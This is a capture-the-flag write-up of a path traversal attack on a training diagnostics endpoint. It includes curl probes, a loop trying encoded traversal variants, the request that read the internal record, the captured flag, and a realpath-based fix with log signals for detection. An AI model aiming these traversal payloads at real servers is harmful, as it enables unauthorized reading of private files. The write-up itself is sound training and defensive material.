## Objective

> The diagnostics helper renders public views for a delivery. Make it render one it was never
> meant to serve.

The desk publishes a public view for `DL-204` plus a render endpoint that turns it into
diagnostics. The card asks for what is behind it: the internal record for the same delivery,
including the field the public copy omits.

## Background you need

- **Path traversal** happens when a program builds a path from user input and relies on the
  *string* rather than the *resolved path* to keep the read inside a directory: `public/` +
  `../internal/DL-204.json` is a legal string naming a file above `public/`.
- **The check that matters is canonicalisation plus prefix comparison**, not "does the input
  contain `..`". Naive filters lose to encoded dots, doubled separators or a symlink that points
  outside while the string looks clean.
- **Helpers are the usual suspect**, and **layout is the vulnerability**: the internal record is
  a sibling of `public/`, so the traversal has somewhere to land.

## Walkthrough

### 1. Recon — the public view

```bash
curl -sS 'http://workbench.training:8083/api/diagnostics/render?delivery_id=DL-204&view=public/DL-204.json'
```

The public render is the baseline: the diagnostics customers are meant to see. It establishes
two facts — the endpoint is unauthenticated and `view` is a `directory/filename` pair. (The body
is not preserved here, so it is not reproduced.)

### 2. Finding the flaw — `view` is a path

`public/DL-204.json` is a directory plus a filename, not an opaque view id — if the value is a
path, the server is doing a join, and the question is whether it canonicalises before opening.
Test the sibling directory that mirrors the public one:

```bash
for v in 'internal/DL-204.json' '../internal/DL-204.json' 'public/../internal/DL-204.json' \
         '..%2finternal%2fDL-204.json'; do
  printf '%-42s ' "$v"
  curl -sS -o /dev/null -w '%{http_code}\n' -G --data-urlencode 'delivery_id=DL-204' \
    --data-urlencode "view=$v" 'http://workbench.training:8083/api/diagnostics/render'
done
```

Variants matter because implementations normalise at different times: a server that prefixes
`public/` itself rejects `internal/DL-204.json` but accepts `public/../internal/DL-204.json`,
while one filtering the raw string may allow the encoded form. `404` = joined path missing,
`403`/`400` = a filter fired, `200` = the read happened.

### 3. Exploitation — the request that worked

```bash
curl -sS -G --data-urlencode 'delivery_id=DL-204' \
  --data-urlencode 'view=public/../internal/DL-204.json' \
  'http://workbench.training:8083/api/diagnostics/render'
```

The helper prepends its public root, `..` cancels it, and the read lands on
`internal/DL-204.json` — the record the public view redacts.

### 4. Getting the flag

The flag came back in the body of that render, inside the internal delivery record — the object
the public view summarises, with its omitted fields. `FLAG{3bf1d8651d39b64c}`.

## Why this works (the vulnerability explained)

The endpoint authenticates nothing, and that is fine: public views are public. The security
boundary is the directory, and the code enforces it with a string operation —
`open(os.path.join(PUBLIC_ROOT, view))` — where `os.path.join` (or `+`, or `Path`) contains
nothing and `public/../internal/…` leaves the root. Only resolving and comparing does:

```python
root, target = map(os.path.realpath, (PUBLIC_ROOT,
                                      os.path.join(PUBLIC_ROOT, request.args["view"])))
if os.path.commonpath([root, target]) != root: abort(403)
```

The class-level lesson: traversal is not a parsing bug but a **containment** bug. Anywhere an
identifier means "a file under X", canonicalise and compare *after* resolution — symlinks
included.

## Detection and fix

- **Log signal:** `view` values containing `..`, `%2e%2e`, `%252e` or doubled separators; `200`s
  whose *resolved* path is outside the public root. Log the resolved path, or you cannot tell
  `public/DL-204.json` from `public/../internal/…`.
- **Fix:** allowlist view identifiers and map them to files server-side, so no caller string
  reaches the filesystem. Where a path is unavoidable, canonicalise with `realpath` +
  `commonpath` and use `O_NOFOLLOW`.
